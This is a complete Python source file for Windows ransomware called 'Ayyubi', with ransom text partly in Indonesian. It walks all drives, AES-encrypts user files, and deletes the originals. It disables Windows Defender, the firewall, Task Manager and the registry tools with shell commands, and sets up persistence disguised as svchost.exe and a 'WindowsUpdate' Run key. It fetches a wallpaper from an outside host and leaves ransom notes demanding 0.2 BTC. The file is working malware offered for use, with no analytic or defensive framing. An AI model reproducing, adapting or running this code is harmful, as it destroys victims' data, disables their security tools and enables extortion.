import os, sys, ctypes, threading, random, string, time, shutil, subprocess, json, base64, hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import urllib.request
from PIL import Image, ImageDraw, ImageFont
import winreg

# ==================== CONFIG ====================
VERSION = "v5.0"
EXT = ".ayyubiencrypted"
WALLPAPER_URL = "https://h.top4top.io/p_3668zmkpf0.png"
EMAIL = "retaabi58@gmail.com"
AMOUNT = "0.2 BTC (Rp 30,000,000)"
BTC_ADDRESS = "bc1qayyubiransomxxxxxx"

class AyyubiRansom:
    def __init__(self):
        self.victim_id = self.generate_id()
        self.master_key = get_random_bytes(32)
        self.encrypted_count = 0
        
    def generate_id(self):
        return hashlib.sha256(get_random_bytes(16)).hexdigest()[:16].upper()
    
    def encrypt_file(self, filepath):
        try:
            # Skip system files
            skip = ['windows', 'system32', 'program files', 'appdata']
            if any(x in filepath.lower() for x in skip):
                return False
            
            # Generate unique key for each file
            file_key = get_random_bytes(32)
            cipher = AES.new(file_key, AES.MODE_CBC)
            
            with open(filepath, 'rb') as f:
                data = f.read()
            
            # Encrypt data
            ct_bytes = cipher.encrypt(pad(data, AES.block_size))
            
            # Encrypt the file key with master key
            key_cipher = AES.new(self.master_key, AES.MODE_CBC, iv=get_random_bytes(16))
            encrypted_key = key_cipher.encrypt(pad(file_key, AES.block_size))
            
            # Save encrypted file
            encrypted_path = filepath + EXT
            with open(encrypted_path, 'wb') as f:
                f.write(b'AYYUBI')  # Header
                f.write(self.victim_id.encode())
                f.write(key_cipher.iv)
                f.write(len(encrypted_key).to_bytes(4, 'big'))
                f.write(encrypted_key)
                f.write(cipher.iv)
                f.write(ct_bytes)
            
            # Delete original
            try:
                os.remove(filepath)
                # Overwrite with garbage first
                with open(filepath, 'wb') as f:
                    f.write(os.urandom(100))
                os.remove(filepath)
            except:
                pass
            
            self.encrypted_count += 1
            return True
            
        except Exception as e:
            return False
    
    def encrypt_all(self):
        drives = [f"{d}:\\" for d in "CDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:")]
        
        for drive in drives:
            try:
                for root, dirs, files in os.walk(drive):
                    # Skip system directories
                    if any(x in root.lower() for x in ['windows', '$recycle.bin', 'system volume information']):
                        continue
                    
                    for file in files:
                        if not file.endswith(EXT):
                            self.encrypt_file(os.path.join(root, file))
            except:
                pass
    
    def disable_windows_defender(self):
        cmds = [
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
            'netsh advfirewall set allprofiles state off',
            'sc stop WinDefend',
            'sc config WinDefend start= disabled',
            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f',
            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f'
        ]
        
        for cmd in cmds:
            try:
                subprocess.run(cmd, shell=True, capture_output=True)
            except:
                pass
    
    def change_wallpaper(self):
        try:
            # Download image
            temp_path = os.path.join(os.environ['TEMP'], 'wall.png')
            urllib.request.urlretrieve(WALLPAPER_URL, temp_path)
            
            # Add text to image
            img = Image.open(temp_path)
            draw = ImageDraw.Draw(img)
            
            try:
                font = ImageFont.truetype("arial.ttf", 36)
            except:
                font = ImageFont.load_default()
            
            text = f"""⚠️ KOMPUTER ANDA DIENKRIPSI! ⚠️

ID: {self.victim_id}
Tebusan: {AMOUNT}
Bitcoin: {BTC_ADDRESS}
Email: {EMAIL}

JANGAN RESTART KOMPUTER!"""
            
            draw.text((50, 50), text, fill=(255, 0, 0), font=font)
            
            final_path = os.path.join(os.environ['TEMP'], 'final_wall.bmp')
            img.save(final_path)
            
            # Set wallpaper
            ctypes.windll.user32.SystemParametersInfoW(20, 0, final_path, 3)
            
        except:
            pass
    
    def add_to_startup(self):
        try:
            # Copy to appdata
            appdata_path = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe')
            shutil.copy(sys.argv[0], appdata_path)
            
            # Registry persistence
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.argv[0])
            winreg.CloseKey(key)
            
        except:
            pass
    
    def create_ransom_note(self):
        note = f"""
╔══════════════════════════════════════════════╗
║           AYYUBI RANSOMWARE {VERSION}          ║
╚══════════════════════════════════════════════╝

SEMUA FILE ANDA TELAH DIENKRIPSI!

Victim ID: {self.victim_id}
Encrypted Files: {self.encrypted_count}
Time: {time.strftime("%Y-%m-%d %H:%M:%S")}

PAYMENT REQUIRED: {AMOUNT}

Send to Bitcoin Address:
{BTC_ADDRESS}

After payment, email transaction ID to:
{EMAIL}
Subject: DECRYPT_{self.victim_id}

WARNING:
• DO NOT RESTART COMPUTER
• DO NOT TRY TO DECRYPT FILES
• TIME LIMIT: 72 HOURS
• PRICE DOUBLES AFTER DEADLINE
"""
        
        # Save to multiple locations
        locations = [
            os.path.join(os.environ['USERPROFILE'], 'Desktop', 'READ_ME_NOW.txt'),
            os.path.join(os.environ['USERPROFILE'], 'Documents', 'DECRYPT_INSTRUCTIONS.txt'),
            'C:\\AYYUBI_RANSOM_NOTE.txt'
        ]
        
        for loc in locations:
            try:
                with open(loc, 'w', encoding='utf-8') as f:
                    f.write(note)
            except:
                pass
    
    def show_message(self):
        ctypes.windll.user32.MessageBoxW(0,
            f"🚨 YOUR COMPUTER HAS BEEN ENCRYPTED! 🚨\n\n"
            f"Victim ID: {self.victim_id}\n"
            f"Files Encrypted: {self.encrypted_count}\n\n"
            f"Read READ_ME_NOW.txt on Desktop for instructions.\n"
            f"Do not shutdown or restart!",
            "AYYUBI RANSOMWARE",
            0x30 | 0x0)
    
    def execute(self):
        # Hide console
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        
        # Disable protections
        self.disable_windows_defender()
        
        # Add persistence
        self.add_to_startup()
        
        # Change wallpaper
        self.change_wallpaper()
        
        # Start encryption in thread
        encrypt_thread = threading.Thread(target=self.encrypt_all)
        encrypt_thread.start()
        
        # Show ransom note
        self.create_ransom_note()
        self.show_message()
        
        # Keep showing messages
        while True:
            time.sleep(120)  # Every 2 minutes
            self.show_message()

if __name__ == "__main__":
    ransomware = AyyubiRansom()
    ransomware.execute()